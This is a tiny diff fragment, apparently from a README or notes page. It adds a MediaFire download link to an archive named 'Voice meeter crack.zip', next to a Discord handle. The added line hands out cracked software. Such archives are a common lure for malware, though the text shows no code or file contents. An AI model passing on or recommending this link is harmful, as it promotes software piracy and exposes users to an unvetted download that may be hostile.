@@ -14,3 +14,4 @@ steps<br>
 
 
 discord@ : nztl
+download : https://www.mediafire.com/file/wquj2i6vlbq4dn4/Voice+meeter+crack.zip/file
